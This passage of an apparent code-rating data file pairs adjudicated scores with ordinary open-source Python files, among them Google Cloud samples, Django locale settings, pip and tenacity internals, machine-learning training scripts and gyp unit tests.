@provide_gcp_context(GCP_DATASTORE_KEY)<<NEWL>>    def test_run_example_dag(self):<<NEWL>>        self.run_dag(""example_gcp_datastore"", CLOUD_DAG_FOLDER)<<NEWL>><<NEWL>>    @provide_gcp_context(GCP_DATASTORE_KEY)<<NEWL>>    def test_run_example_dag_operations(self):<<NEWL>>        self.run_dag(""example_gcp_datastore_operations"", CLOUD_DAG_FOLDER)"
52	adjudicated	4	"#!/usr/bin/env python<<NEWL>><<NEWL>># Copyright 2019 Google LLC<<NEWL>>#<<NEWL>># Licensed under the Apache License, Version 2.0 (the ""License"");<<NEWL>># you may not use this file except in compliance with the License.<<NEWL>># You may obtain a copy of the License at<<NEWL>>#<<NEWL>>#     http://www.apache.org/licenses/LICENSE-2.0<<NEWL>>#<<NEWL>># Unless required by applicable law or agreed to in writing, software<<NEWL>># distributed under the License is distributed on an ""AS IS"" BASIS,<<NEWL>># WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.<<NEWL>># See the License for the specific language governing permissions and<<NEWL>>""""""<<NEWL>>command line application and sample code for creating an accessing a secret.<<NEWL>>""""""<<NEWL>><<NEWL>><<NEWL>>def quickstart(_project_id=None, _secret_id=None):<<NEWL>>    # [START secretmanager_quickstart]<<NEWL>>    # Import the Secret Manager client library.<<NEWL>>    from google.cloud import secretmanager<<NEWL>><<NEWL>>    # GCP project in which to store secrets in Secret Manager.<<NEWL>>    project_id = ""YOUR_PROJECT_ID""<<NEWL>><<NEWL>>    # ID of the secret to create.<<NEWL>>    secret_id = ""YOUR_SECRET_ID""<<NEWL>><<NEWL>>    # [END secretmanager_quickstart]<<NEWL>>    project_id = _project_id<<NEWL>>    secret_id = _secret_id<<NEWL>>    # [START secretmanager_quickstart]<<NEWL>>    # Create the Secret Manager client.<<NEWL>>    client = secretmanager.SecretManagerServiceClient()<<NEWL>><<NEWL>>    # Build the parent name from the project.<<NEWL>>    parent = f""projects/{project_id}""<<NEWL>><<NEWL>>    # Create the parent secret.<<NEWL>>    secret = client.create_secret(<<NEWL>>        request={<<NEWL>>            ""parent"": parent,<<NEWL>>            ""secret_id"": secret_id,<<NEWL>>            ""secret"": {""replication"": {""automatic"": {}}},<<NEWL>>        }<<NEWL>>    )<<NEWL>><<NEWL>>    # Add the secret version.<<NEWL>>    version = client.add_secret_version(<<NEWL>>        request={""parent"": secret.name, ""payload"": {""data"": b""hello world!""}}<<NEWL>>    )<<NEWL>><<NEWL>>    # Access the secret version.<<NEWL>>    response = client.access_secret_version(request={""name"": version.name})<<NEWL>><<NEWL>>    # Print the secret payload.<<NEWL>>    #<<NEWL>>    # WARNING: Do not print the secret in a production environment - this<<NEWL>>    # snippet is showing how to access the secret material.<<NEWL>>    payload = response.payload.data.decode(""UTF-8"")<<NEWL>>    print(""Plaintext: {}"".format(payload))<<NEWL>>    # [END secretmanager_quickstart]<<NEWL>><<NEWL>><<NEWL>>if __name__ == ""__main__"":<<NEWL>>    quickstart()"
112	adjudicated	4	"# This file is distributed under the same license as the Django package.<<NEWL>>#<<NEWL>># The *_FORMAT strings use the Django date format syntax,<<NEWL>># see https://docs.djangoproject.com/en/dev/ref/templates/builtins/#date<<NEWL>>DATE_FORMAT = 'l, j F, Y'<<NEWL>>TIME_FORMAT = 'h:i a'<<NEWL>>DATETIME_FORMAT = 'j F, Y h:i a'<<NEWL>>YEAR_MONTH_FORMAT = 'F, Y'<<NEWL>>MONTH_DAY_FORMAT = 'j F'<<NEWL>>SHORT_DATE_FORMAT = 'j.M.Y'<<NEWL>>SHORT_DATETIME_FORMAT = 'j.M.Y H:i'<<NEWL>>FIRST_DAY_OF_WEEK = 1  # (Monday)<<NEWL>><<NEWL>># The *_INPUT_FORMATS strings use the Python strftime format syntax,<<NEWL>># see https://docs.python.org/library/datetime.html#strftime-strptime-behavior<<NEWL>># Kept ISO formats as they are in first position<<NEWL>>DATE_INPUT_FORMATS = [<<NEWL>>    '%Y-%m-%d', '%m/%d/%Y', '%m/%d/%y',     # '2006-10-25', '10/25/2006', '10/25/06'<<NEWL>>    '%d.%m.%Y', '%d.%m.%y',                 # '25.10.2006', '25.10.06'<<NEWL>>    # '%d %b %Y', '%d %b, %Y', '%d %b. %Y',   # '25 Oct 2006', '25 Oct, 2006', '25 Oct. 2006'<<NEWL>>    # '%d %B %Y', '%d %B, %Y',                # '25 October 2006', '25 October, 2006'<<NEWL>>]<<NEWL>>DATETIME_INPUT_FORMATS = [<<NEWL>>    '%Y-%m-%d %H:%M:%S',     # '2006-10-25 14:30:59'<<NEWL>>    '%Y-%m-%d %H:%M:%S.%f',  # '2006-10-25 14:30:59.000200'<<NEWL>>    '%Y-%m-%d %H:%M',        # '2006-10-25 14:30'<<NEWL>>    '%d.%m.%Y %H:%M:%S',     # '25.10.2006 14:30:59'<<NEWL>>    '%d.%m.%Y %H:%M:%S.%f',  # '25.10.2006 14:30:59.000200'<<NEWL>>    '%d.%m.%Y %H:%M',        # '25.10.2006 14:30'<<NEWL>>    '%d.%m.%y %H:%M:%S',     # '25.10.06 14:30:59'<<NEWL>>    '%d.%m.%y %H:%M:%S.%f',  # '25.10.06 14:30:59.000200'<<NEWL>>    '%d.%m.%y %H:%M',        # '25.10.06 14:30'<<NEWL>>    '%m/%d/%Y %H:%M:%S',     # '10/25/2006 14:30:59'<<NEWL>>    '%m/%d/%Y %H:%M:%S.%f',  # '10/25/2006 14:30:59.000200'<<NEWL>>    '%m/%d/%Y %H:%M',        # '10/25/2006 14:30'<<NEWL>>    '%m/%d/%y %H:%M:%S',     # '10/25/06 14:30:59'<<NEWL>>    '%m/%d/%y %H:%M:%S.%f',  # '10/25/06 14:30:59.000200'<<NEWL>>    '%m/%d/%y %H:%M',        # '10/25/06 14:30'<<NEWL>>]<<NEWL>>DECIMAL_SEPARATOR = '.'<<NEWL>>THOUSAND_SEPARATOR = "" ""<<NEWL>>NUMBER_GROUPING = 3"
283	adjudicated	2	"alphabet = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z']<<NEWL>><<NEWL>>def caesar(start_text, shift_amount, cipher_direction):<<NEWL>>  end_text = """"<<NEWL>>  if cipher_direction == ""decode"":<<NEWL>>    shift_amount *= -1<<NEWL>>  for char in start_text:<<NEWL>>    #TODO-3: What happens if the user enters a number/symbol/space?<<NEWL>>    #Can you fix the code to keep the number/symbol/space when the text is encoded/decoded?<<NEWL>>    #e.g. start_text = ""meet me at 3""<<NEWL>>    #end_text = ""•••• •• •• 3""<<NEWL>>    if char in alphabet:<<NEWL>>      position = alphabet.index(char)<<NEWL>>      new_position = position + shift_amount<<NEWL>>      end_text += alphabet[new_position]<<NEWL>>    else:<<NEWL>>      end_text += char<<NEWL>>  print(f""Here's the {cipher_direction}d result: {end_text}"")<<NEWL>><<NEWL>>#TODO-1: Import and print the logo from art.py when the program starts.<<NEWL>>from art import logo<<NEWL>>print(logo)<<NEWL>><<NEWL>>#TODO-4: Can you figure out a way to ask the user if they want to restart the cipher program?<<NEWL>>#e.g. Type 'yes' if you want to go again. Otherwise type 'no'.<<NEWL>>#If they type 'yes' then ask them for the direction/text/shift again and call the caesar() function again?<<NEWL>>#Hint: Try creating a while loop that continues to execute the program if the user types 'yes'.<<NEWL>>should_end = False<<NEWL>>while not should_end:<<NEWL>><<NEWL>>  direction = input(""Type 'encode' to encrypt, type 'decode' to decrypt:\n"")<<NEWL>>  text = input(""Type your message:\n"").lower()<<NEWL>>  shift = int(input(""Type the shift number:\n""))<<NEWL>>  #TODO-2: What if the user enters a shift that is greater than the number of letters in the alphabet?<<NEWL>>  #Try running the program and entering a shift number of 45.<<NEWL>>  #Add some code so that the program continues to work even if the user enters a shift number greater than 26. <<NEWL>>  #Hint: Think about how you can use the modulus (%).<<NEWL>>  shift = shift % 26<<NEWL>><<NEWL>>  caesar(start_text=text, shift_amount=shift, cipher_direction=direction)<<NEWL>><<NEWL>>  restart = input(""Type 'yes' if you want to go again. Otherwise type 'no'.\n"")<<NEWL>>  if restart == ""no"":<<NEWL>>    should_end = True<<NEWL>>    print(""Goodbye"")<<NEWL>>    "
184	adjudicated	2	"# Copyright 2020 Google LLC<<NEWL>>#<<NEWL>># Licensed under the Apache License, Version 2.0 (the ""License"");<<NEWL>># you may not use this file except in compliance with the License.<<NEWL>># You may obtain a copy of the License at<<NEWL>>#<<NEWL>>#    http://www.apache.org/licenses/LICENSE-2.0<<NEWL>>#<<NEWL>># Unless required by applicable law or agreed to in writing, software<<NEWL>># distributed under the License is distributed on an ""AS IS"" BASIS,<<NEWL>># WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.<<NEWL>># See the License for the specific language governing permissions and<<NEWL>># limitations under the License.<<NEWL>><<NEWL>><<NEWL>>def batch_predict(project_id, model_id, input_uri, output_uri):<<NEWL>>    """"""Batch predict""""""<<NEWL>>    # [START automl_batch_predict]<<NEWL>>    from google.cloud import automl<<NEWL>><<NEWL>>    # TODO(developer): Uncomment and set the following variables<<NEWL>>    # project_id = ""YOUR_PROJECT_ID""<<NEWL>>    # model_id = ""YOUR_MODEL_ID""<<NEWL>>    # input_uri = ""gs://YOUR_BUCKET_ID/path/to/your/input/csv_or_jsonl""<<NEWL>>    # output_uri = ""gs://YOUR_BUCKET_ID/path/to/save/results/""<<NEWL>><<NEWL>>    prediction_client = automl.PredictionServiceClient()<<NEWL>><<NEWL>>    # Get the full path of the model.<<NEWL>>    model_full_id = f""projects/{project_id}/locations/us-central1/models/{model_id}""<<NEWL>><<NEWL>>    gcs_source = automl.GcsSource(input_uris=[input_uri])<<NEWL>><<NEWL>>    input_config = automl.BatchPredictInputConfig(gcs_source=gcs_source)<<NEWL>>    gcs_destination = automl.GcsDestination(output_uri_prefix=output_uri)<<NEWL>>    output_config = automl.BatchPredictOutputConfig(gcs_destination=gcs_destination)<<NEWL>><<NEWL>>    response = prediction_client.batch_predict(<<NEWL>>        name=model_full_id, input_config=input_config, output_config=output_config<<NEWL>>    )<<NEWL>><<NEWL>>    print(""Waiting for operation to complete..."")<<NEWL>>    print(<<NEWL>>        f""Batch Prediction results saved to Cloud Storage bucket. {response.result()}""<<NEWL>>    )<<NEWL>>    # [END automl_batch_predict]"
215	adjudicated	3	"""""""Stuff that differs in different Python versions and platform<<NEWL>>distributions.""""""<<NEWL>><<NEWL>>import logging<<NEWL>>import os<<NEWL>>import sys<<NEWL>><<NEWL>>__all__ = [""get_path_uid"", ""stdlib_pkgs"", ""WINDOWS""]<<NEWL>><<NEWL>><<NEWL>>logger = logging.getLogger(__name__)<<NEWL>><<NEWL>><<NEWL>>def has_tls() -> bool:<<NEWL>>    try:<<NEWL>>        import _ssl  # noqa: F401  # ignore unused<<NEWL>><<NEWL>>        return True<<NEWL>>    except ImportError:<<NEWL>>        pass<<NEWL>><<NEWL>>    from pip._vendor.urllib3.util import IS_PYOPENSSL<<NEWL>><<NEWL>>    return IS_PYOPENSSL<<NEWL>><<NEWL>><<NEWL>>def get_path_uid(path: str) -> int:<<NEWL>>    """"""<<NEWL>>    Return path's uid.<<NEWL>><<NEWL>>    Does not follow symlinks:<<NEWL>>        https://github.com/pypa/pip/pull/935#discussion_r5307003<<NEWL>><<NEWL>>    Placed this function in compat due to differences on AIX and<<NEWL>>    Jython, that should eventually go away.<<NEWL>><<NEWL>>    :raises OSError: When path is a symlink or can't be read.<<NEWL>>    """"""<<NEWL>>    if hasattr(os, ""O_NOFOLLOW""):<<NEWL>>        fd = os.open(path, os.O_RDONLY | os.O_NOFOLLOW)<<NEWL>>        file_uid = os.fstat(fd).st_uid<<NEWL>>        os.close(fd)<<NEWL>>    else:  # AIX and Jython<<NEWL>>        # WARNING: time of check vulnerability, but best we can do w/o NOFOLLOW<<NEWL>>        if not os.path.islink(path):<<NEWL>>            # older versions of Jython don't have `os.fstat`<<NEWL>>            file_uid = os.stat(path).st_uid<<NEWL>>        else:<<NEWL>>            # raise OSError for parity with os.O_NOFOLLOW above<<NEWL>>            raise OSError(f""{path} is a symlink; Will not return uid for symlinks"")<<NEWL>>    return file_uid<<NEWL>><<NEWL>><<NEWL>># packages in the stdlib that may have installation metadata, but should not be<<NEWL>># considered 'installed'.  this theoretically could be determined based on<<NEWL>># dist.location (py27:`sysconfig.get_paths()['stdlib']`,<<NEWL>># py26:sysconfig.get_config_vars('LIBDEST')), but fear platform variation may<<NEWL>># make this ineffective, so hard-coding<<NEWL>>stdlib_pkgs = {""python"", ""wsgiref"", ""argparse""}<<NEWL>><<NEWL>><<NEWL>># windows detection, covers cpython and ironpython<<NEWL>>WINDOWS = sys.platform.startswith(""win"") or (sys.platform == ""cli"" and os.name == ""nt"")"
355	adjudicated	2	import lightly.data as data<<NEWL>><<NEWL>># the collate function applies random transforms to the input images<<NEWL>>collate_fn = data.ImageCollateFunction(input_size=32, cj_prob=0.5)<<NEWL>>import torch<<NEWL>><<NEWL>># create a dataset from your image folder<<NEWL>>dataset = data.LightlyDataset(input_dir='./my/cute/cats/dataset/')<<NEWL>><<NEWL>># build a PyTorch dataloader<<NEWL>>dataloader = torch.utils.data.DataLoader(<<NEWL>>    dataset,                # pass the dataset to the dataloader<<NEWL>>    batch_size=128,         # a large batch size helps with the learning<<NEWL>>    shuffle=True,           # shuffling is important!<<NEWL>>    collate_fn=collate_fn)  # apply transformations to the input images<<NEWL>>import torchvision<<NEWL>><<NEWL>>from lightly.loss import NTXentLoss<<NEWL>>from lightly.models.modules.heads import SimCLRProjectionHead<<NEWL>><<NEWL>># use a resnet backbone<<NEWL>>resnet = torchvision.models.resnext101_64x4d()  # or efficientnet0_b0<<NEWL>>resnet = torch.nn.Sequential(*list(resnet.children())[:-1])<<NEWL>><<NEWL>># build a SimCLR model<<NEWL>>class SimCLR(torch.nn.Module):<<NEWL>>    def __init__(self, backbone, hidden_dim, out_dim):<<NEWL>>        super().__init__()<<NEWL>>        self.backbone = backbone<<NEWL>>        self.projection_head = SimCLRProjectionHead(hidden_dim, hidden_dim, out_dim)<<NEWL>><<NEWL>>    def forward(self, x):<<NEWL>>        h = self.backbone(x).flatten(start_dim=1)<<NEWL>>        z = self.projection_head(h)<<NEWL>>        return z<<NEWL>><<NEWL>>model = SimCLR(resnet, hidden_dim=512, out_dim=128)<<NEWL>><<NEWL>># use a criterion for self-supervised learning<<NEWL>># (normalized temperature-scaled cross entropy loss)<<NEWL>>criterion = NTXentLoss(temperature=0.5)<<NEWL>><<NEWL>># get a PyTorch optimizer<<NEWL>>optimizer = torch.optim.SGD(model.parameters(), lr=1e-0, weight_decay=1e-5)<<NEWL>>device = torch.device('cuda' if torch.cuda.is_available() else 'cpu')<<NEWL>>max_epochs = 10<<NEWL>>for epoch in range(max_epochs):<<NEWL>>    for (x0, x1), _, _ in dataloader:<<NEWL>><<NEWL>>        x0 = x0.to(device)<<NEWL>>        x1 = x1.to(device)<<NEWL>><<NEWL>>        z0 = model(x0)<<NEWL>>        z1 = model(x1)<<NEWL>><<NEWL>>        loss = criterion(z0, z1)<<NEWL>>        loss.backward()<<NEWL>><<NEWL>>        optimizer.step()<<NEWL>>        optimizer.zero_grad()
244	adjudicated	2	"import os<<NEWL>>import json<<NEWL>><<NEWL>>import torch<<NEWL>>from PIL import Image<<NEWL>>from torchvision import transforms<<NEWL>>import matplotlib.pyplot as plt<<NEWL>><<NEWL>>from model import vgg<<NEWL>><<NEWL>><<NEWL>>def main():<<NEWL>>    device = torch.device(""cuda:0"" if torch.cuda.is_available() else ""cpu"")<<NEWL>><<NEWL>>    data_transform = transforms.Compose(<<NEWL>>        [transforms.Resize((224, 224)),<<NEWL>>         transforms.ToTensor(),<<NEWL>>         transforms.Normalize((0.5, 0.5, 0.5), (0.5, 0.5, 0.5))])<<NEWL>><<NEWL>>    # load image<<NEWL>>    img_path = ""../tulip.jpg""<<NEWL>>    assert os.path.exists(img_path), ""file: '{}' dose not exist."".format(img_path)<<NEWL>>    img = Image.open(img_path)<<NEWL>>    plt.imshow(img)<<NEWL>>    # [N, C, H, W]<<NEWL>>    img = data_transform(img)<<NEWL>>    # expand batch dimension<<NEWL>>    img = torch.unsqueeze(img, dim=0)<<NEWL>><<NEWL>>    # read class_indict<<NEWL>>    json_path = './class_indices.json'<<NEWL>>    assert os.path.exists(json_path), ""file: '{}' dose not exist."".format(json_path)<<NEWL>><<NEWL>>    with open(json_path, ""r"") as f:<<NEWL>>        class_indict = json.load(f)<<NEWL>>    <<NEWL>>    # create model<<NEWL>>    model = vgg(model_name=""vgg16"", num_classes=5).to(device)<<NEWL>>    # load model weights<<NEWL>>    weights_path = ""./vgg16Net.pth""<<NEWL>>    assert os.path.exists(weights_path), ""file: '{}' dose not exist."".format(weights_path)<<NEWL>>    model.load_state_dict(torch.load(weights_path, map_location=device))<<NEWL>><<NEWL>>    model.eval()<<NEWL>>    with torch.no_grad():<<NEWL>>        # predict class<<NEWL>>        output = torch.squeeze(model(img.to(device))).cpu()<<NEWL>>        predict = torch.softmax(output, dim=0)<<NEWL>>        predict_cla = torch.argmax(predict).numpy()<<NEWL>><<NEWL>>    print_res = ""class: {}   prob: {:.3}"".format(class_indict[str(predict_cla)],<<NEWL>>                                                 predict[predict_cla].numpy())<<NEWL>>    plt.title(print_res)<<NEWL>>    for i in range(len(predict)):<<NEWL>>        print(""class: {:10}   prob: {:.3}"".format(class_indict[str(i)],<<NEWL>>                                                  predict[i].numpy()))<<NEWL>>    plt.show()<<NEWL>><<NEWL>><<NEWL>>if __name__ == '__main__':<<NEWL>>    main()"
95	adjudicated	1	"# Copyright 2017 Elisey Zanko<<NEWL>>#<<NEWL>># Licensed under the Apache License, Version 2.0 (the ""License"");<<NEWL>># you may not use this file except in compliance with the License.<<NEWL>># You may obtain a copy of the License at<<NEWL>>#<<NEWL>># http://www.apache.org/licenses/LICENSE-2.0<<NEWL>>#<<NEWL>># Unless required by applicable law or agreed to in writing, software<<NEWL>># distributed under the License is distributed on an ""AS IS"" BASIS,<<NEWL>># WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.<<NEWL>># See the License for the specific language governing permissions and<<NEWL>># limitations under the License.<<NEWL>><<NEWL>>import sys<<NEWL>>import typing<<NEWL>><<NEWL>>from pip._vendor.tenacity import BaseRetrying<<NEWL>>from pip._vendor.tenacity import DoAttempt<<NEWL>>from pip._vendor.tenacity import DoSleep<<NEWL>>from pip._vendor.tenacity import RetryCallState<<NEWL>><<NEWL>>from tornado import gen<<NEWL>><<NEWL>>if typing.TYPE_CHECKING:<<NEWL>>    from tornado.concurrent import Future<<NEWL>><<NEWL>>_RetValT = typing.TypeVar(""_RetValT"")<<NEWL>><<NEWL>><<NEWL>>class TornadoRetrying(BaseRetrying):<<NEWL>>    def __init__(self, sleep: ""typing.Callable[[float], Future[None]]"" = gen.sleep, **kwargs: typing.Any) -> None:<<NEWL>>        super().__init__(**kwargs)<<NEWL>>        self.sleep = sleep<<NEWL>><<NEWL>>    @gen.coroutine<<NEWL>>    def __call__(  # type: ignore  # Change signature from supertype<<NEWL>>        self,<<NEWL>>        fn: ""typing.Callable[..., typing.Union[typing.Generator[typing.Any, typing.Any, _RetValT], Future[_RetValT]]]"",<<NEWL>>        *args: typing.Any,<<NEWL>>        **kwargs: typing.Any,<<NEWL>>    ) -> ""typing.Generator[typing.Any, typing.Any, _RetValT]"":<<NEWL>>        self.begin()<<NEWL>><<NEWL>>        retry_state = RetryCallState(retry_object=self, fn=fn, args=args, kwargs=kwargs)<<NEWL>>        while True:<<NEWL>>            do = self.iter(retry_state=retry_state)<<NEWL>>            if isinstance(do, DoAttempt):<<NEWL>>                try:<<NEWL>>                    result = yield fn(*args, **kwargs)<<NEWL>>                except BaseException:  # noqa: B902<<NEWL>>                    retry_state.set_exception(sys.exc_info())<<NEWL>>                else:<<NEWL>>                    retry_state.set_result(result)<<NEWL>>            elif isinstance(do, DoSleep):<<NEWL>>                retry_state.prepare_for_next_attempt()<<NEWL>>                yield self.sleep(do)<<NEWL>>            else:<<NEWL>>                raise gen.Return(do)"
304	adjudicated	3	"# Copyright (c) Facebook, Inc. and its affiliates.<<NEWL>>#<<NEWL>># This source code is licensed under the MIT license found in the<<NEWL>># LICENSE file in the root directory of this source tree.<<NEWL>>""""""isort:skip_file""""""<<NEWL>><<NEWL>>import functools<<NEWL>>import importlib<<NEWL>><<NEWL>><<NEWL>>dependencies = [<<NEWL>>    ""dataclasses"",<<NEWL>>    ""hydra"",<<NEWL>>    ""numpy"",<<NEWL>>    ""omegaconf"",<<NEWL>>    ""regex"",<<NEWL>>    ""requests"",<<NEWL>>    ""torch"",<<NEWL>>]<<NEWL>><<NEWL>><<NEWL>># Check for required dependencies and raise a RuntimeError if any are missing.<<NEWL>>missing_deps = []<<NEWL>>for dep in dependencies:<<NEWL>>    try:<<NEWL>>        importlib.import_module(dep)<<NEWL>>    except ImportError:<<NEWL>>        # Hack: the hydra package is provided under the ""hydra-core"" name in<<NEWL>>        # pypi. We don't want the user mistakenly calling `pip install hydra`<<NEWL>>        # since that will install an unrelated package.<<NEWL>>        if dep == ""hydra"":<<NEWL>>            dep = ""hydra-core""<<NEWL>>        missing_deps.append(dep)<<NEWL>>if len(missing_deps) > 0:<<NEWL>>    raise RuntimeError(""Missing dependencies: {}"".format("", "".join(missing_deps)))<<NEWL>><<NEWL>><<NEWL>># only do fairseq imports after checking for dependencies<<NEWL>>from fairseq.hub_utils import (  # noqa; noqa<<NEWL>>    BPEHubInterface as bpe,<<NEWL>>    TokenizerHubInterface as tokenizer,<<NEWL>>)<<NEWL>>from fairseq.models import MODEL_REGISTRY  # noqa<<NEWL>><<NEWL>><<NEWL>># torch.hub doesn't build Cython components, so if they are not found then try<<NEWL>># to build them here<<NEWL>>try:<<NEWL>>    import fairseq.data.token_block_utils_fast  # noqa<<NEWL>>except ImportError:<<NEWL>>    try:<<NEWL>>        import cython  # noqa<<NEWL>>        import os<<NEWL>>        from setuptools import sandbox<<NEWL>><<NEWL>>        sandbox.run_setup(<<NEWL>>            os.path.join(os.path.dirname(__file__), ""setup.py""),<<NEWL>>            [""build_ext"", ""--inplace""],<<NEWL>>        )<<NEWL>>    except ImportError:<<NEWL>>        print(<<NEWL>>            ""Unable to build Cython components. Please make sure Cython is ""<<NEWL>>            ""installed if the torch.hub model you are loading depends on it.""<<NEWL>>        )<<NEWL>><<NEWL>><<NEWL>># automatically expose models defined in FairseqModel::hub_models<<NEWL>>for _model_type, _cls in MODEL_REGISTRY.items():<<NEWL>>    for model_name in _cls.hub_models().keys():<<NEWL>>        globals()[model_name] = functools.partial(<<NEWL>>            _cls.from_pretrained,<<NEWL>>            model_name,<<NEWL>>        )"
126	adjudicated	2	"#!/usr/bin/env python<<NEWL>><<NEWL>># Copyright (c) 2012 Google Inc. All rights reserved.<<NEWL>># Use of this source code is governed by a BSD-style license that can be<<NEWL>># found in the LICENSE file.<<NEWL>><<NEWL>>""""""Unit tests for the common.py file.""""""<<NEWL>><<NEWL>>import gyp.common<<NEWL>>import unittest<<NEWL>>import sys<<NEWL>><<NEWL>><<NEWL>>class TestTopologicallySorted(unittest.TestCase):<<NEWL>>  def test_Valid(self):<<NEWL>>    """"""Test that sorting works on a valid graph with one possible order.""""""<<NEWL>>    graph = {<<NEWL>>        'a': ['b', 'c'],<<NEWL>>        'b': [],<<NEWL>>        'c': ['d'],<<NEWL>>        'd': ['b'],<<NEWL>>        }<<NEWL>>    def GetEdge(node):<<NEWL>>      return tuple(graph[node])<<NEWL>>    self.assertEqual(<<NEWL>>      gyp.common.TopologicallySorted(graph.keys(), GetEdge),<<NEWL>>      ['a', 'c', 'd', 'b'])<<NEWL>><<NEWL>>  def test_Cycle(self):<<NEWL>>    """"""Test that an exception is thrown on a cyclic graph.""""""<<NEWL>>    graph = {<<NEWL>>        'a': ['b'],<<NEWL>>        'b': ['c'],<<NEWL>>        'c': ['d'],<<NEWL>>        'd': ['a'],<<NEWL>>        }<<NEWL>>    def GetEdge(node):<<NEWL>>      return tuple(graph[node])<<NEWL>>    self.assertRaises(<<NEWL>>      gyp.common.CycleError, gyp.common.TopologicallySorted,<<NEWL>>      graph.keys(), GetEdge)<<NEWL>><<NEWL>><<NEWL>>class TestGetFlavor(unittest.TestCase):<<NEWL>>  """"""Test that gyp.common.GetFlavor works as intended""""""<<NEWL>>  original_platform = ''<<NEWL>><<NEWL>>  def setUp(self):<<NEWL>>    self.original_platform = sys.platform<<NEWL>><<NEWL>>  def tearDown(self):<<NEWL>>    sys.platform = self.original_platform<<NEWL>><<NEWL>>  def assertFlavor(self, expected, argument, param):<<NEWL>>    sys.platform = argument<<NEWL>>    self.assertEqual(expected, gyp.common.GetFlavor(param))<<NEWL>><<NEWL>>  def test_platform_default(self):<<NEWL>>    self.assertFlavor('freebsd', 'freebsd9' , {})<<NEWL>>    self.assertFlavor('freebsd', 'freebsd10', {})<<NEWL>>    self.assertFlavor('openbsd', 'openbsd5' , {})<<NEWL>>    self.assertFlavor('solaris', 'sunos5'   , {});<<NEWL>>    self.assertFlavor('solaris', 'sunos'    , {});<<NEWL>>    self.assertFlavor('linux'  , 'linux2'   , {});<<NEWL>>    self.assertFlavor('linux'  , 'linux3'   , {});<<NEWL>><<NEWL>>  def test_param(self):<<NEWL>>    self.assertFlavor('foobar', 'linux2' , {'flavor': 'foobar'})<<NEWL>><<NEWL>><<NEWL>>if __name__ == '__main__':<<NEWL>>  unittest.main()"
66	adjudicated	3	"r""""""<<NEWL>>Building the required library in this example requires a source distribution<<NEWL>>of NumPy or clone of the NumPy git repository since distributions.c is not<<NEWL>>included in binary distributions.<<NEWL>><<NEWL>>On *nix, execute in numpy/random/src/distributions<<NEWL>><<NEWL>>export ${PYTHON_VERSION}=3.8 # Python version<<NEWL>>export PYTHON_INCLUDE=#path to Python's include folder, usually \<<NEWL>>    ${PYTHON_HOME}/include/python${PYTHON_VERSION}m<<NEWL>>export NUMPY_INCLUDE=#path to numpy's include folder, usually \<<NEWL>>    ${PYTHON_HOME}/lib/python${PYTHON_VERSION}/site-packages/numpy/core/include<<NEWL>>gcc -shared -o libdistributions.so -fPIC distributions.c \<<NEWL>>    -I${NUMPY_INCLUDE} -I${PYTHON_INCLUDE}<<NEWL>>mv libdistributions.so ../../_examples/numba/<<NEWL>><<NEWL>>On Windows<<NEWL>><<NEWL>>rem PYTHON_HOME and PYTHON_VERSION are setup dependent, this is an example<<NEWL>>set PYTHON_HOME=c:\Anaconda<<NEWL>>set PYTHON_VERSION=38<<NEWL>>cl.exe /LD .\distributions.c -DDLL_EXPORT \<<NEWL>>    -I%PYTHON_HOME%\lib\site-packages\numpy\core\include \<<NEWL>>    -I%PYTHON_HOME%\include %PYTHON_HOME%\libs\python%PYTHON_VERSION%.lib<<NEWL>>move distributions.dll ../../_examples/numba/<<NEWL>>""""""<<NEWL>>import os<<NEWL>><<NEWL>>import numba as nb<<NEWL>>import numpy as np<<NEWL>>from cffi import FFI<<NEWL>><<NEWL>>from numpy.random import PCG64<<NEWL>><<NEWL>>ffi = FFI()<<NEWL>>if os.path.exists('./distributions.dll'):<<NEWL>>    lib = ffi.dlopen('./distributions.dll')<<NEWL>>elif os.path.exists('./libdistributions.so'):<<NEWL>>    lib = ffi.dlopen('./libdistributions.so')<<NEWL>>else:<<NEWL>>    raise RuntimeError('Required DLL/so file was not found.')<<NEWL>><<NEWL>>ffi.cdef(""""""<<NEWL>>double random_standard_normal(void *bitgen_state);<<NEWL>>"""""")<<NEWL>>x = PCG64()<<NEWL>>xffi = x.cffi<<NEWL>>bit_generator = xffi.bit_generator<<NEWL>><<NEWL>>random_standard_normal = lib.random_standard_normal<<NEWL>><<NEWL>><<NEWL>>def normals(n, bit_generator):<<NEWL>>    out = np.empty(n)<<NEWL>>    for i in range(n):<<NEWL>>        out[i] = random_standard_normal(bit_generator)<<NEWL>>    return out<<NEWL>><<NEWL>><<NEWL>>normalsj = nb.jit(normals, nopython=True)<<NEWL>><<NEWL>># Numba requires a memory address for void *<<NEWL>># Can also get address from x.ctypes.bit_generator.value<<NEWL>>bit_generator_address = int(ffi.cast('uintptr_t', bit_generator))<<NEWL>><<NEWL>>norm = normalsj(1000, bit_generator_address)<<NEWL>>print(norm[:12])"
177	adjudicated	3	"# Copyright (c) Microsoft Corporation. All rights reserved.<<NEWL>># Licensed under the MIT License. See LICENSE in the project root<<NEWL>># for license information.<<NEWL>><<NEWL>>import sys<<NEWL>><<NEWL>><<NEWL>>if __name__ == ""__main__"":<<NEWL>>    # debugpy can also be invoked directly rather than via -m. In this case, the first<<NEWL>>    # entry on sys.path is the one added automatically by Python for the directory<<NEWL>>    # containing this file. This means that import debugpy will not work, since we need<<NEWL>>    # the parent directory of debugpy/ to be in sys.path, rather than debugpy/ itself.<<NEWL>>    #<<NEWL>>    # The other issue is that many other absolute imports will break, because they<<NEWL>>    # will be resolved relative to debugpy/ - e.g. `import debugger` will then try<<NEWL>>    # to import debugpy/debugger.py.<<NEWL>>    #<<NEWL>>    # To fix both, we need to replace the automatically added entry such that it points<<NEWL>>    # at parent directory of debugpy/ instead of debugpy/ itself, import debugpy with that<<NEWL>>    # in sys.path, and then remove the first entry entry altogether, so that it doesn't<<NEWL>>    # affect any further imports we might do. For example, suppose the user did:<<NEWL>>    #<<NEWL>>    #   python /foo/bar/debugpy ...<<NEWL>>    #<<NEWL>>    # At the beginning of this script, sys.path will contain ""/foo/bar/debugpy"" as the<<NEWL>>    # first entry. What we want is to replace it with 